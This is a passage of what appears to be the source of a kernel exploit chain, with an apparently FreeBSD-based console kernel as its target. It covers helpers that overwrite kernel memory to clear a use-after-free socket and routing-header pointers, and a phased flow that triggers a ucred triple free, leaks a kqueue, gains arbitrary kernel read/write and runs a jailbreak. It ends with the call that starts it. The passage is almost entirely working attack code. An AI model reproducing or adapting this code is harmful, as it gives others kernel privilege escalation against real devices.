  log('Returning fget: ' + hex(f) + ' for fd: ' + fd)
  return f
}

function remove_rthr_from_socket (fd: number): void {
  // In case last triplet was not found in kwriteslow
  // At this point we don't care about twins/triplets
  if (fd > 0) {
    const fp = fget(fd)
    if (fp.gt(new BigInt(0xFFFF0000, 0x0))) {
      const f_data = kread64(fp.add(0x00))
      const so_pcb = kread64(f_data.add(0x18))
      const in6p_outputopts = kread64(so_pcb.add(0x118))
      const ok = kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
      if (!ok) {
        log('[RM_RTHDR] kwrite64 failed for fd: ' + fd)
      }
    } else {
      log('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
    }
  }
}

function remove_uaf_file (): void {
  if (typeof uaf_socket === 'undefined') {
    throw new Error('uaf_socket is undefined')
  }

  const uafFile = fget(uaf_socket)
  let ok = kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0))
  if (!ok) {
    log('[RM_UAF] kwrite64 failed for main uaf_socket')
  }

  let removed = 0
  for (let i = 0; i < 0x1000; i++) {
    const s = Number(socket(AF_UNIX, SOCK_STREAM, 0))
    if (fget(s).eq(uafFile)) {
      ok = kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0))
      if (!ok) {
        log('[RM_UAF] kwrite64 failed while clearing cloned socket fd=' + s)
      }
      removed++
    }
    close(new BigInt(s))
    if (removed === 3) break
  }
}

function retry (label: string, attempts: number, fn: () => boolean): boolean {
  for (let i = 0; i < attempts; i++) {
    const ok = fn()
    if (ok) {
      if (i > 0) {
        log(label + ': succeeded after retry #' + i)
      }
      return true
    }
    log(label + ': attempt ' + (i + 1) + ' failed')
  }
  log(label + ': all attempts failed')
  return false
}

/* ===========================
 *   yield_to_render
 * ===========================
 */

function yield_to_render(nextPhase) {
  const phaseName = nextPhase.name || 'anonymous_phase'
  const scheduledAt = Date.now()
  log(`[FLOW] Scheduling next phase: ${phaseName} at ${scheduledAt}`)

  setTimeout(() => {
    const startedAt = Date.now()
    log(`[FLOW] ENTER ${phaseName} (delay: ${startedAt - scheduledAt}ms)`)

    try {
      nextPhase()
    } catch (e) {
      log(`[FLOW] ERROR inside ${phaseName}: ${e}`)
    }

  }, 0)
}

/* ===========================
 *   Final Exploit Flow
 * ===========================
 */

let exploit_count = 0
let exploit_end = false

function netctrl_exploit(): void {
  setup_log_screen()

  const supported_fw = init()
  if (!supported_fw) {
    return
  }

  log('Setting up exploit...')
  watchdog_start()
  watchdog_tick('netctrl_exploit')

  log('[FLOW] Requesting transition to: exploit_phase_setup')
  yield_to_render(exploit_phase_setup)
}

function exploit_phase_setup(): void {
  log('[FLOW] inside exploit_phase_setup')
  watchdog_tick('exploit_phase_setup')

  setup()
  log('Workers spawned')

  exploit_count = 0
  exploit_end = false

  log('[FLOW] EXIT exploit_phase_setup')
  log('[FLOW] Requesting transition to: exploit_phase_trigger')
  yield_to_render(exploit_phase_trigger)
}

function exploit_phase_trigger(): void {
  log('[FLOW] inside exploit_phase_trigger')
  watchdog_tick('exploit_phase_trigger')

  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W')
    cleanup()
    return   // ← نهاية طبيعية
  }

  exploit_count++
  log(`[TRIGGER] Triggering vulnerability (${exploit_count}/${MAIN_LOOP_ITERATIONS})`)

  const ok = trigger_ucred_triplefree()
  if (!ok) {
    log('[TRIGGER] Triple free failed, retrying...')
    log('[FLOW] Early exit from phase')
    log('[FLOW] Requesting transition to: exploit_phase_trigger')
    yield_to_render(exploit_phase_trigger)
    return
  }

  log('[TRIGGER] Triple free succeeded, moving to leak phase...')
  log('[FLOW] EXIT exploit_phase_trigger')
  log('[FLOW] Requesting transition to: exploit_phase_leak')
  yield_to_render(exploit_phase_leak)
}

function exploit_phase_leak(): void {
  log('[FLOW] inside exploit_phase_leak')
  watchdog_tick('exploit_phase_leak')

  if (!leak_kqueue()) {
    log('[LEAK] leak_kqueue failed, retrying trigger...')
    log('[FLOW] Early exit from phase')
    log('[FLOW] Requesting transition to: exploit_phase_trigger')
    yield_to_render(exploit_phase_trigger)
    return
  }

  log('Setting up arbitrary R/W...')
  log('[FLOW] EXIT exploit_phase_leak')
  log('[FLOW] Requesting transition to: exploit_phase_rw')
  yield_to_render(exploit_phase_rw)
}

function exploit_phase_rw(): void {
  log('[FLOW] inside exploit_phase_rw')
  watchdog_tick('exploit_phase_rw')
  log('[RW] exploit_phase_rw: enter')

  const ok = retry('setup_arbitrary_rw', 3, () => setup_arbitrary_rw())

  if (!ok) {
    log('[RW] setup_arbitrary_rw failed after retries, restarting trigger phase')
    log('[FLOW] Early exit from phase')
    log('[FLOW] Requesting transition to: exploit_phase_trigger')
    yield_to_render(exploit_phase_trigger)
    return
  }

  log('Jailbreaking...')
  log('[FLOW] EXIT exploit_phase_rw')
  log('[FLOW] Requesting transition to: exploit_phase_jailbreak')
  yield_to_render(exploit_phase_jailbreak)
}

function exploit_phase_jailbreak(): void {
  log('[FLOW] inside exploit_phase_jailbreak')
  watchdog_tick('exploit_phase_jailbreak')

  jailbreak()

  log('[FLOW] EXIT exploit_phase_jailbreak')
}

function exploit_phase_finish(): void {
  if (exploit_end) {
    log('[FLOW] Early exit from phase')
    return
  }

  exploit_end = true
  log('Exploit completed successfully')
  cleanup()
}

/* ===========================
 *   Entry point
 * ===========================
 */

netctrl_exploit()
